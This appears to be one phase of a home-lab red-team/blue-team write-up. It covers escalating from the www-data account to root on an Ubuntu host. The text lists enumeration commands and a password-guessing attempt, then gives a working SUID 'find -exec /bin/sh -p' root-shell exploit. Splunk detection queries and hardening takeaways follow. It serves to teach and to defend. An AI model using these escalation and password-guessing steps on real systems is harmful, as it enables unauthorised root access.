# Phase 3: Privilege Escalation

**Goal:** Escalate from `www-data` (the web server's low-privilege account) to `root` on the Ubuntu pivot host. 
Why? Root access is needed to configure the SSH tunnel in Phase 4. With it, I'll plant a key that'll allow me to SSH into/through Ubuntu. 

---

## Red Team

### Starting Position

- Shell as: `www-data`
- Host: Ubuntu (`192.168.100.20` / `192.168.200.20`)
- Goal: `root`

---

### Enumeration

Manual enumeration from the www-data shell:

```bash
# Attempt lateral movement to dvwa user via password guessing
su dvwa   # tried: password, letmein, abc123, charley — all failed

# Check container escape (LXD)
lxd --version
lxc list

# Find SUID binaries — run as any user, executes as file owner (root)
find / -perm -4000 -type f 2>/dev/null
```

**Key findings:**
```
# su dvwa attempts — all returned: Authentication failure

# LXD:
# Unable to trigger the installation of the LXD snap.
# Please make sure you're a member of the 'lxd' system group.

# SUID binary found:
/usr/bin/find
```

---

### Exploitation

**Vector:** SUID `find` binary — `find` has the Set User ID bit set, meaning it executes as root regardless of who runs it. The `-exec` flag lets you run arbitrary commands within `find`, inheriting that root privilege. The `-p` flag on `/bin/sh` preserves the root UID instead of dropping back to low-level. 

In plain english: I'm running a program (find) that's been misconfigured to run with the HIGHEST privileges, regardless of which system user runs it; I'm setting that program to open a shell, which will return a shell with the highest access, i.e., root.

```bash
# Confirm find has SUID
find / -perm -4000 -type f 2>/dev/null | grep find
# /usr/bin/find

# Exploit: use find's -exec to spawn a root shell
find . -exec /bin/sh -p \; -quit
```

**Confirmed root:**
```bash
# whoami
root
```

![SUID find exploitation — www-data → root via `find . -exec /bin/sh -p \; -quit`](../screenshots/phase3-suid-privesc.png)

---

## Blue Team: What Splunk Saw

### Detection Queries

```
index=* sourcetype=syslog "sudo" user=www-data
```

```
index=* sourcetype=syslog "/usr/bin/find" "-exec"
```

```
index=* sourcetype=auth "authentication failure" user=dvwa
```

### What Fired

The multiple failed `su dvwa` attempts would appear in `/var/log/auth.log` as repeated authentication failures — a pattern consistent with credential guessing from a compromised service account.

### What Was Missed

SUID binary abuse is nearly invisible without process-level auditing (`auditd`). Standard syslog doesn't record every command executed in a shell session. Without auditd rules watching specifically for `find -exec /bin/sh`, this escalation produced no log entry that Splunk could have alerted on.

---

## Key Takeaways

- **SUID binaries are dangerous when they support arbitrary command execution.** `find`, `vim`, `python`, `perl`, and dozens of others can be abused if the SUID bit is set. [GTFOBins](https://gtfobins.github.io) documents every known vector.
- **www-data gets SUID access the same as any user.** SUID doesn't check the caller's identity: it always runs as the file's owner (root). This is why minimizing SUID binaries is a hardening baseline.
- **Failed `su` attempts create noise.** Even when password guessing fails, the attempts are detectable: useful for alerting on compromised service accounts attempting lateral movement.

---

← [Phase 2 — Initial Access](phase2-initial-access.md) | [Phase 4 — Lateral Movement](phase4-lateral-movement.md) →
